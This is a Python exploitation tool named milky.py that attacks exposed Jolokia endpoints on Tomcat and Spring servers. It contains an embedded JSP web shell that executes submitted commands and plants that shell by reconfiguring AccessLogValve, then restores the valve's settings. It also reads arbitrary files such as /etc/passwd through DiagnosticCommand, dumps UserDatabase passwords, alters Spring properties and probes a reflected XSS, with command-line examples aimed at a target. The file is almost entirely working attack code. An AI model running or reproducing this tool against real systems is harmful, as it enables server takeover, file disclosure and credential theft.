#!/usr/bin/env python3


import argparse
import random
import re
import sys
import time
import urllib.parse
import requests
import urllib3
from typing import Any, Dict, List, Optional

# stupid localhost warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_COL = {
    "red": "\033[31m",
    "green": "\033[32m",
    "yellow": "\033[33m",
    "cyan": "\033[36m",
    "reset": "\033[0m"
}
_USE_COLOR = sys.stderr.isatty() and sys.stdout.isatty() and sys.platform != "win32"

def color_text(s: str, col: str) -> str:
    return f"{_COL[col]}{s}{_COL['reset']}" if _USE_COLOR else s

def info(msg: str): print(color_text("[*] " + msg, "cyan"))
def success(msg: str): print(color_text("[+] " + msg, "green"))
def warning(msg: str): print(color_text("[!] " + msg, "yellow"))
def error(msg: str): print(color_text("[-] " + msg, "red"), file=sys.stderr)
def debug(msg: str): print(color_text("[DEBUG] " + msg, "reset"))

class JolokiaExploiter:
    FORM_SHELL_PAYLOAD = """
<%@ page import="java.util.*,java.io.*" %><html><body>
<form method="post"><input name="cmd" placeholder="Command" autofocus>
<input type="submit" value="Run"></form><pre>
<% if("POST".equalsIgnoreCase(request.getMethod())) {
    String c=request.getParameter("cmd");
    if (c != null && !c.isEmpty()) {
        Process p = Runtime.getRuntime().exec(c);
        java.util.Scanner s = new java.util.Scanner(p.getInputStream())
                                    .useDelimiter("\\\\A");
        out.print(s.hasNext() ? s.next() : "");
    }
} %></pre></body></html>
"""
    
    def __init__(self, url: str, user: str = None, password: str = None, debug_mode: bool = False):
        self.base_url = url.rstrip('/')
        if not self.base_url.endswith('/jolokia'):
            warning("URL might not be Jolokia endpoint")
        
        self.root_url = self.base_url.rsplit('/jolokia', 1)[0]
        self.session = requests.Session()
        self.session.verify = False
        self.debug_mode = debug_mode
        
        if user and password:
            self.session.auth = (user, password)
        
        self.cache = {}
        self._detect_version()

    def _log(self, msg: str, level: str = "info"):
        if self.debug_mode or level != "debug":
            {"info": info, "debug": debug, "warning": warning, "error": error}.get(level, info)(msg)

    def _detect_version(self):
        try:
            response = self.session.get(f"{self.base_url}/version", timeout=5)
            if response.status_code == 200:
                version = response.json().get('value', {}).get('agent')
                success(f"Jolokia version: {version}")
        except Exception as e:
            error(f"Version detection failed: {e}")

    def _request(self, path: str = "", data: dict = None) -> Optional[requests.Response]:
        url = f"{self.base_url}/{path.lstrip('/')}" if path else self.base_url
        try:
            if data:
                self._log(f"POST {url} - Data: {data}", "debug")
                response = self.session.post(url, json=data, timeout=15)
            else:
                self._log(f"GET {url}", "debug")
                response = self.session.get(url, timeout=15)
                
            if response:
                self._log(f"Response ({response.status_code}): {response.text[:200]}", "debug")
            return response
        except requests.RequestException as e:
            error(f"Request failed: {e}")
            return None

    def _load_cache(self):
        if self.cache:
            return
        response = self._request("list")
        if response and response.status_code == 200:
            self.cache = response.json().get('value', {})
        else:
            error("Failed to load MBean cache")

    def find_mbeans(self, pattern: str) -> List[str]:
        self._load_cache()
        regex = re.compile(pattern, re.IGNORECASE)
        return [
            f"{domain}:{bean}"
            for domain, beans in self.cache.items()
            for bean in beans
            if regex.search(bean)
        ]

    def check_vulnerabilities(self):
        self._load_cache()
        critical_mbeans = [
            ("DiagnosticCommand", "File read/write and agent loading"),
            ("AccessLogValve", "Remote code execution via log poisoning"),
            ("UserDatabase", "Credential leakage"),
            ("JMXConfigurator", "JNDI injection via Logback"),
            ("EnvironmentManager", "Spring property manipulation"),
        ]
        
        found = False
        for mbean_type, description in critical_mbeans:
            if mbeans := self.find_mbeans(mbean_type):
                found = True
                success(f"{description} available:")
                for mbean in mbeans[:3]:
                    print(f"  - {mbean}")
        
        if not found:
            warning("No critical MBeans found")

    def read_file(self, file_path: str) -> Optional[str]:
        if file_path.startswith("/"):
            encoded_path = "!/" + file_path.lstrip("/").replace("/", "!/")
        else:
            encoded_path = file_path.replace("/", "!/")
        response = self._request(f"exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/{encoded_path}")
        if response and response.status_code == 200:
            raw = response.json().get("value", "")
            if raw.startswith("Could not load file"):
                error(raw.strip())
                return None
            content = re.sub(r"Parsing of compiler directives failed.*", "", raw, flags=re.DOTALL)
            m = re.search(r"\n\s*At '[^']*'\.\s*\n", content)
            if m:
                content = content[m.end():]
            content = content.strip()
            if not content:
                error("Empty response")
                return None
            success(f"Successfully read {file_path}")
            info(f"{len(content.splitlines())} lines extracted")
            return content
        error(f"Failed to read {file_path}")
        return None

    def _get_property_via_spring(self, mbean: str, property_name: str) -> Optional[str]:
        request = {
            "type": "exec",
            "mbean": mbean,
            "operation": "getProperty",
            "arguments": [property_name]
        }
        r = self._request(data=request)
        if r and r.status_code == 200:
            value = r.json().get("value")
            if value:
                success(f"Got {property_name} via Spring: {value}")
                return value
        error(f"Failed to get {property_name} via Spring")
        return None

    def _get_property_via_jmx(self, mbean: str, property_name: str) -> Optional[str]:
        request = {
            "type": "read",
            "mbean": mbean,
            "attribute": "SystemProperties",
            "path": property_name
        }
        r = self._request(data=request)
        if r and r.status_code == 200:
            value = r.json().get("value")
            if value:
                success(f"Got {property_name} via JMX: {value}")
                return value
        error(f"Failed to get {property_name} via JMX")
        return None

    def _discover_webroot_from_config(self) -> Optional[str]:
        info("Trying to discover webroot from server.xml")
        config_paths = ["/conf/server.xml", "conf/server.xml", "../conf/server.xml", "/etc/tomcat/server.xml", "/usr/local/tomcat/conf/server.xml"]
        for path in config_paths:
            content = self.read_file(path)
            if not content:
                continue
            m = re.search(r'<Host\s+[^>]*appBase="([^"]+)"', content)
            if m:
                app_base = m.group(1)
                success(f"Found appBase in server.xml: {app_base}")
                if app_base.startswith("$CATALINA_BASE"):
                    base = self._get_property_via_jmx("java.lang:type=System", "catalina.base")
                    if base:
                        app_base = app_base.replace("$CATALINA_BASE", base)
                elif app_base.startswith("$CATALINA_HOME"):
                    home = self._get_property_via_jmx("java.lang:type=System", "catalina.home")
                    if home:
                        app_base = app_base.replace("$CATALINA_HOME", home)
                if "ROOT" not in app_base:
                    app_base = f"{app_base}/ROOT"
                return app_base
        error("Failed to discover webroot from configuration")
        return None

    def get_catalina_base(self) -> Optional[str]:
        env_mbean = next(iter(self.find_mbeans("EnvironmentManager")), None)
        if env_mbean:
            catalina_base = self._get_property_via_spring(env_mbean, "catalina.base")
            if catalina_base:
                return catalina_base
        catalina_base = self._get_property_via_jmx("java.lang:type=Runtime", "catalina.base")
        if catalina_base:
            return catalina_base
        catalina_base = self._get_property_via_jmx("java.lang:type=System", "catalina.base")
        if catalina_base:
            return catalina_base
        for prop in ["catalina.home", "user.dir"]:
            val = self._get_property_via_jmx("java.lang:type=System", prop)
            if val:
                return val
        return self._discover_webroot_from_config()

    def deploy_shell(self) -> Optional[str]:
        valve = next(iter(self.find_mbeans(r'AccessLogValve')), None)
        if not valve:
            error("AccessLogValve not found")
            return None
        success(f"AccessLogValve: {valve}")
        base = self.get_catalina_base()
        if base:
            target_dir = f"{base}/webapps/ROOT"
            success(f"Using directory: {target_dir}")
        else:
            target_dir = "webapps/ROOT"
            warning("Using default directory: webapps/ROOT")
        r = self._request("", data={"type": "read", "mbean": valve})
        if not r or r.status_code != 200:
            error("Cannot read valve attributes")
            return None
        backup = r.json().get("value", {})
        
        info("Backed up valve attributes")
        prefix = str(random.randint(1000, 9999))
        file_date = f"_{random.randint(1000, 9999)}"
        tweaks = {
            "pattern": " ",
            "checkExists": "true",
            "fileDateFormat": file_date,
            "prefix": prefix,
            "suffix": ".jsp",
            "directory": target_dir,
            "buffered": "false",
            "asyncSupported": "false",
        }
        
        info("Configuring valve attributes")
        for attr, value in tweaks.items():
            self._request("", data={
                "type": "write",
                "mbean": valve,
                "attribute": attr,
                "value": value
            })
        
        info("Sleeping 10s for valve reload")
        time.sleep(10)
        payload = self.FORM_SHELL_PAYLOAD.replace('%', '%{%}t')
        
        info("Writing shell payload to pattern attribute")
        self._request("", data={
            "type": "write",
            "mbean": valve,
            "attribute": "pattern",
            "value": payload
        })
        
        info("Triggering request to create shell file")
        self._request("version")
        
        info("Resetting pattern attribute")
        self._request("", data={
            "type": "write",
            "mbean": valve,
            "attribute": "pattern",
            "value": " "
        })
        
        info("Sleeping 5s for log flush")
        time.sleep(5)
        restore_order = [k for k in backup.keys() if k != "pattern"]
        
        info("Restoring original valve attributes")
        for k in restore_order:
            self._request("", data={
                "type": "write",
                "mbean": valve,
                "attribute": k,
                "value": backup[k]
            })

        shell_path = f"/{prefix}{file_date}.jsp"
        shell_url = f"{self.root_url}{shell_path}"
        info(f"Verifying shell at: {shell_url}")
        try:
            response = self.session.get(shell_url, timeout=10, verify=False)
            if response.status_code == 200:
                if "form method" in response.text:
                    success("Webshell deployed successfully!")
                    success(f"URL: {shell_url}")
                    success(f"Usage: curl -X POST {shell_url} -d 'cmd=whoami'")
                    return shell_url
                else:
                    error("Webshell deployed but payload not found in response")
            else:
                error(f"Unexpected HTTP status: {response.status_code}")
        except Exception as e:
            error(f"Verification failed: {e}")
        error("Webshell deployment failed")
        return None

    def get_credentials(self) -> Dict[str, str]:
        info("Enumerating UserDatabase MBeans")
        credentials = {}
        user_dbs = self.find_mbeans("UserDatabase")
        if not user_dbs:
            warning("No UserDatabase MBeans found")
            return credentials
        for db in user_dbs:
            info(f"Querying users from {db}")
            response = self._request(f"read/{db}/users")
            if not response or response.status_code != 200:
                error(f"Failed to read users from {db}")
                continue
            users = response.json().get('value', '')
            for user_entry in str(users).split(','):
                if match := re.search(r'username="([^"]+)"', user_entry):
                    username = match.group(1)
                    pass_response = self._request(
                        f"read/Users:database=UserDatabase,type=User,username=\"{username}\"/password"
                    )
                    if pass_response and pass_response.status_code == 200:
                        password = pass_response.json().get('value', '')
                        credentials[username] = password
                        success(f"Found credential for {username}")
        if credentials:
            success(f"Extracted {len(credentials)} credential(s)")
        else:
            warning("No credentials extracted")
        return credentials


    def manage_spring_property(self, action: str, key: str, value: str = None) -> Optional[str]:
        env_mbean = next(iter(self.find_mbeans("EnvironmentManager")), None)
        if not env_mbean:
            error("EnvironmentManager MBean not found")
            return None
        
        if action == "get":
            response = self._request(f"read/{env_mbean}/property/{key}")
            if response and response.status_code == 200:
                return response.json().get('value')
            return None
        elif action == "set" and value:
            response = self._request(data={
                "type": "write",
                "mbean": env_mbean,
                "attribute": key,
                "value": value
            })
            if response and response.status_code == 200:
                return value
        return None

    def check_xss(self) -> bool:
        marker = ''.join(random.choices('0123456789abcdef', k=8))
        inj_raw = f"<svg onload=alert({marker})>"
        inj_enc = urllib.parse.quote(inj_raw, safe='')
        path = f"read{inj_enc}?mimeType=text/html"
        info(f"Testing XSS with marker {marker}")
        r = self._request(path)
        if not r:
            error("Probe request failed")
            return False

        ct = r.headers.get("Content-Type", "")
        reflected = marker in r.text and "<svg" in r.text.lower()

        if "text/html" in ct.lower() and reflected:
            success("Reflected XSS detected! (CVE-2018-1000129)")
            return True

        error("XSS not detected")
        return False


def main():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""Examples:
  Vulnerability scan:
    milky.py http://target:8080/jolokia scan
    
  Deploy webshell:
    milky.py http://target:8080/jolokia deploy
    
  Read file:
    milky.py http://target:8080/jolokia read -f /etc/passwd
  
  Checker for reflected XSS (CVE-2018-1000129):
    milky.py http://target:8080/jolokia xss
    
  Extract credentials:
    milky.py http://target:8080/jolokia creds
    
  Manage Spring properties:
    milky.py http://target:8080/jolokia spring -a get -k server.port
    milky.py http://target:8080/jolokia spring -a set -k spring.datasource.url -v jdbc:h2:mem:test
"""
    )
    parser.add_argument("url", help="Jolokia endpoint URL")
    parser.add_argument("--user", help="HTTP Basic Auth username")
    parser.add_argument("--password", help="HTTP Basic Auth password")
    parser.add_argument("--debug", action="store_true", help="Enable debug output")
    
    subparsers = parser.add_subparsers(dest="command", required=True)
    
    # Scan command
    scan_parser = subparsers.add_parser("scan", help="Scan for vulnerabilities")
    
    # Deploy command
    deploy_parser = subparsers.add_parser("deploy", help="Deploy webshell")
    
    # Read command
    read_parser = subparsers.add_parser("read", help="Read remote file")
    read_parser.add_argument("-f", "--file", required=True, help="File path to read")
    
    # Credentials command
    creds_parser = subparsers.add_parser("creds", help="Extract credentials")

    xss_parser = subparsers.add_parser("xss", help="Check for reflected XSS (CVE-2018-1000129)")


    # Spring command
    spring_parser = subparsers.add_parser("spring", help="Manage Spring properties")
    spring_parser.add_argument("-a", "--action", choices=["get", "set"], required=True, help="Action to perform")
    spring_parser.add_argument("-k", "--key", required=True, help="Property key")
    spring_parser.add_argument("-v", "--value", help="Property value (required for set)")
    args = parser.parse_args()
    
    try:
        exploiter = JolokiaExploiter(
            args.url, 
            args.user, 
            args.password,
            debug_mode=args.debug
        )
        
        if args.command == "scan":
            exploiter.check_vulnerabilities()
            
        elif args.command == "deploy":
            shell_url = exploiter.deploy_shell()
            
        elif args.command == "read":
            content = exploiter.read_file(args.file)
            if content:
                print(content)
            else:
                error("File read failed")
            
        elif args.command == "creds":
            credentials = exploiter.get_credentials()
            if credentials:
                for user, pwd in credentials.items():
                    print(f"{user}:{pwd}")
            else:
                warning("No credentials found")
        
        elif args.command == "xss":
            exploiter.check_xss()

        elif args.command == "spring":
            if args.action == "get":
                value = exploiter.manage_spring_property("get", args.key)
                if value is not None:
                    print(value)
                else:
                    error("Property not found")
            elif args.action == "set":
                if not args.value:
                    error("Value is required for set operation")
                    return
                if exploiter.manage_spring_property("set", args.key, args.value) is not None:
                    success("Property set successfully")
                else:
                    error("Property set failed")
                
    except Exception as e:
        error(f"Operation failed: {e}")
    except KeyboardInterrupt:
        error("\nOperation aborted")

if __name__ == "__main__":
    main()